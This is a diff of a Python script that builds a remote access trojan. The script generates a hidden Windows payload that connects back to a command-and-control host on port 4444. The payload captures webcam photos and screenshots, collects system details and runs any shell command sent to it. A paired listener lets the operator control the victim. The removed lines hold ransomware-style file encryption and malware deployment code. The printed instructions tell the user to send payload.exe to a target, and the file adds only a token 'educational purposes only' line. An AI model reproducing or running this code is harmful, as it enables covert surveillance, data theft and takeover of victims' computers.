@@ -1,209 +1,219 @@
-import socket
-import json
-import base64
 import os
-import time
-import threading
+import base64
 import subprocess
-from datetime import datetime
 import sys
-import signal
-import cv2
-import numpy as np
+
+# Configuration
+YOUR_IP = "192.168.1.3"  # CHANGE THIS
+PORT = 4444
+LOG_FILE = "victim_data.txt"
+
+PAYLOAD_CODE = f'''import os
+import sys
+import socket
+import subprocess
+import platform
+import getpass
+import uuid
+import json
+import time
+import ctypes
+import winreg
+import shutil
+import tempfile
+import zipfile
 import pyautogui
+import cv2
+import psutil
+from threading import Thread
 from cryptography.fernet import Fernet
 
 # Configuration
-C2_IP = "192.168.1.3"  # CHANGE THIS
-C2_PORT = 4444
-LOG_FILE = "victim_logs.txt"
-MALWARE_FOLDER = "malware_storage"  # Folder containing your malware files
+C2_IP = "{YOUR_IP}"
+C2_PORT = {PORT}
+LOG_FILE = "{LOG_FILE}"
+FERNET_KEY = Fernet.generate_key()
 
 class VictimControl:
     def __init__(self):
         self.webcam_count = 0
         self.screenshot_count = 0
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.live_stream_active = False
+        self.cipher = Fernet(FERNET_KEY)
 
-    # System Information
     def get_system_info(self):
-        info = {
-            "system": {
-                "hostname": os.getenv("COMPUTERNAME"),
-                "username": os.getenv("USERNAME"),
-                "os": f"{os.name} {sys.platform}",
-                "cpu": os.cpu_count(),
-                "memory": psutil.virtual_memory()._asdict()
-            },
-            "network": {
+        try:
+            return {{
+                "hostname": platform.node(),
+                "username": getpass.getuser(),
+                "os": platform.platform(),
+                "cpu": {{
+                    "cores": os.cpu_count(),
+                    "usage": psutil.cpu_percent(interval=1)
+                }},
+                "ram": psutil.virtual_memory()._asdict(),
+                "disks": [psutil.disk_usage(part.mountpoint)._asdict() 
+                         for part in psutil.disk_partitions()],
                 "ip": socket.gethostbyname(socket.gethostname()),
-                "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
+                "mac": ':'.join(['{{:02x}}'.format((uuid.getnode() >> ele) & 0xff) 
                       for ele in range(0,8*6,8)][::-1])
-            }
-        }
-        return info
+            }}
+        except Exception as e:
+            return {{"error": str(e)}}
 
-    # Webcam Capture
     def capture_webcam(self):
-        cam = cv2.VideoCapture(0)
-        ret, frame = cam.read()
-        cam.release()
-        if ret:
-            _, buffer = cv2.imencode('.jpg', frame)
-            return base64.b64encode(buffer).decode()
-        return None
+        try:
+            cam = cv2.VideoCapture(0)
+            ret, frame = cam.read()
+            cam.release()
+            if ret:
+                _, buffer = cv2.imencode('.jpg', frame)
+                return base64.b64encode(buffer).decode()
+        except:
+            return None
 
-    # Screenshot Capture
     def capture_screenshot(self):
-        screenshot = pyautogui.screenshot()
-        buffer = np.array(screenshot)
-        _, buffer = cv2.imencode('.png', buffer)
-        return base64.b64encode(buffer).decode()
-
-    # File Encryption (Ransomware)
-    def encrypt_files(self, path):
-        encrypted_files = []
-        for root, _, files in os.walk(path):
-            for file in files:
-                try:
-                    filepath = os.path.join(root, file)
-                    with open(filepath, 'rb') as f:
-                        data = f.read()
-                    encrypted = self.cipher.encrypt(data)
-                    with open(filepath + '.encrypted', 'wb') as f:
-                        f.write(encrypted)
-                    os.remove(filepath)
-                    encrypted_files.append(filepath)
-                except:
-                    continue
-        return encrypted_files
-
-    # File Decryption
-    def decrypt_files(self, path, key):
         try:
-            cipher = Fernet(key)
-            for root, _, files in os.walk(path):
-                for file in files:
-                    if file.endswith('.encrypted'):
-                        try:
-                            filepath = os.path.join(root, file)
-                            with open(filepath, 'rb') as f:
-                                data = f.read()
-                            decrypted = cipher.decrypt(data)
-                            with open(filepath[:-9], 'wb') as f:
-                                f.write(decrypted)
-                            os.remove(filepath)
-                        except:
-                            continue
-            return True
+            screenshot = pyautogui.screenshot()
+            buffer = np.array(screenshot)
+            _, buffer = cv2.imencode('.png', buffer)
+            return base64.b64encode(buffer).decode()
         except:
-            return False
+            return None
 
-    # Live Screen Monitoring
-    def start_live_monitoring(self, conn):
-        self.live_stream_active = True
-        while self.live_stream_active:
-            try:
-                screenshot = self.capture_screenshot()
-                conn.send(('LIVE:' + screenshot).encode())
-                time.sleep(0.5)  # Adjust for smoother streaming
-            except:
-                self.live_stream_active = False
-                break
-
-    # Malware Deployment
-    def deploy_malware(self, malware_name):
+    def execute_command(self, cmd):
         try:
-            malware_path = os.path.join(MALWARE_FOLDER, malware_name)
-            if os.path.exists(malware_path):
-                subprocess.Popen(malware_path, shell=True)
-                return True
-            return False
-        except:
-            return False
+            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+            return result.decode(errors="ignore")
+        except Exception as e:
+            return str(e)
 
-def handle_connection(conn, addr):
+def connect_to_c2():
     rat = VictimControl()
-    print(f"\n[+] New connection from {addr[0]}")
-    
-    # Send initial system info
-    conn.send(json.dumps(rat.get_system_info()).encode())
-    
     while True:
         try:
-            cmd = conn.recv(1024).decode().strip()
-            if not cmd:
-                continue
+            with socket.socket() as s:
+                s.connect((C2_IP, C2_PORT))
+                s.send(json.dumps(rat.get_system_info()).encode())
                 
-            if cmd == "webcam":
-                data = rat.capture_webcam()
-                conn.send(data.encode() if data else b"WEBCAM_ERROR")
-                
-            elif cmd == "screenshot":
-                data = rat.capture_screenshot()
-                conn.send(data.encode() if data else b"SCREENSHOT_ERROR")
-                
-            elif cmd.startswith("encrypt "):
-                path = cmd[8:]
-                encrypted = rat.encrypt_files(path)
-                conn.send(json.dumps(encrypted).encode())
-                
-            elif cmd.startswith("decrypt "):
-                parts = cmd.split(maxsplit=2)
-                if len(parts) == 3:
-                    success = rat.decrypt_files(parts[1], parts[2])
-                    conn.send(b"DECRYPT_SUCCESS" if success else b"DECRYPT_FAILED")
-                    
-            elif cmd == "live_start":
-                threading.Thread(target=rat.start_live_monitoring, args=(conn,)).start()
-                conn.send(b"LIVE_STARTED")
-                
-            elif cmd == "live_stop":
-                rat.live_stream_active = False
-                conn.send(b"LIVE_STOPPED")
-                
-            elif cmd.startswith("deploy "):
-                malware = cmd[7:]
-                success = rat.deploy_malware(malware)
-                conn.send(b"MALWARE_DEPLOYED" if success else b"MALWARE_FAILED")
-                
-            elif cmd == "exit":
-                break
-                
-            else:
-                conn.send(b"UNKNOWN_COMMAND")
-                
-        except ConnectionResetError:
-            print(f"[-] Connection lost with {addr[0]}")
-            break
+                while True:
+                    cmd = s.recv(1024).decode().strip()
+                    if not cmd or cmd == "exit":
+                        break
+                        
+                    if cmd == "webcam":
+                        data = rat.capture_webcam()
+                        s.send(data.encode() if data else b"WEBCAM_ERROR")
+                    elif cmd == "screenshot":
+                        data = rat.capture_screenshot()
+                        s.send(data.encode() if data else b"SCREENSHOT_ERROR")
+                    else:
+                        output = rat.execute_command(cmd)
+                        s.send(output.encode())
+                        
         except Exception as e:
-            print(f"[-] Error: {str(e)}")
-            continue
-            
-    conn.close()
-    print(f"[-] Connection closed: {addr[0]}")
+            time.sleep(30)
+
+if __name__ == "__main__":
+    connect_to_c2()
+'''
+
+LISTENER_CODE = f'''import socket
+import json
+import base64
+import os
+from datetime import datetime
+
+def save_file(content, filename):
+    with open(filename, "wb") as f:
+        f.write(base64.b64decode(content))
 
 def start_listener():
-    if not os.path.exists(MALWARE_FOLDER):
-        os.makedirs(MALWARE_FOLDER)
-        print(f"[*] Created malware storage folder: {MALWARE_FOLDER}")
-
     s = socket.socket()
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(('0.0.0.0', C2_PORT))
-    s.listen(5)
-    print(f"[*] Listening on {C2_IP}:{C2_PORT}")
+    s.bind(('0.0.0.0', {PORT}))
+    s.listen(1)
+    print("[*] Waiting for victim... (Run payload.exe on target)")
+    conn, addr = s.accept()
+    print(f"[+] Connected to {{addr[0]}}")
     
-    try:
-        while True:
-            conn, addr = s.accept()
-            threading.Thread(target=handle_connection, args=(conn, addr)).start()
-    except KeyboardInterrupt:
-        print("\n[!] Shutting down server...")
-    finally:
-        s.close()
+    # Show initial system info
+    sysinfo = json.loads(conn.recv(65535).decode())
+    print("\\n=== SYSTEM INFO ===")
+    print(json.dumps(sysinfo, indent=4))
+    
+    while True:
+        cmd = input("\\nRAT> ").strip()
+        if not cmd:
+            continue
+            
+        conn.send(cmd.encode())
+        
+        if cmd.lower() == "exit":
+            break
+            
+        data = conn.recv(10485760).decode()  # 10MB max
+        
+        if cmd == "webcam":
+            save_file(data, f"webcam_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.jpg")
+            print("[+] Webcam saved")
+        elif cmd == "screenshot":
+            save_file(data, f"screen_{{datetime.now().strftime('%Y%m%d_%H%M%S')}}.png")
+            print("[+] Screenshot saved")
+        else:
+            print(data)
 
 if __name__ == "__main__":
     start_listener()
+'''
+
+def generate_payload():
+    # Create payload file
+    with open("payload.py", "w") as f:
+        f.write(PAYLOAD_CODE)
+    
+    # Create listener file
+    with open("listener.py", "w") as f:
+        f.write(LISTENER_CODE)
+    
+    # Install required packages
+    print("[*] Installing required packages...")
+    subprocess.run([sys.executable, "-m", "pip", "install", 
+                   "pyinstaller", "pyautogui", "opencv-python", 
+                   "psutil", "numpy", "cryptography"], check=True)
+    
+    # Compile payload
+    print("[*] Compiling payload.exe...")
+    subprocess.run([
+        'pyinstaller',
+        '--onefile',
+        '--noconsole',
+        '--add-data', 'payload.py;.',
+        '--hidden-import', 'pyautogui',
+        '--hidden-import', 'cv2',
+        '--hidden-import', 'psutil',
+        '--hidden-import', 'numpy',
+        '--hidden-import', 'cryptography',
+        '--distpath', 'dist',
+        'payload.py'
+    ], check=True)
+    
+    print(f'''
+[✅] RAT TOOL READY
+
+[📌] INSTRUCTIONS:
+1. Send dist/payload.exe to target
+2. Run listener.py on your machine
+3. Wait for connection
+
+[🔥] COMMANDS:
+- webcam       - Take webcam photo
+- screenshot   - Capture screen
+- sysinfo      - Show system info
+- Any CMD command
+
+[⚠️] IMPORTANT:
+- Replace 'YOUR_IP_HERE' before generating payload
+- For educational purposes only
+''')
+
+if __name__ == "__main__":
+    generate_payload()
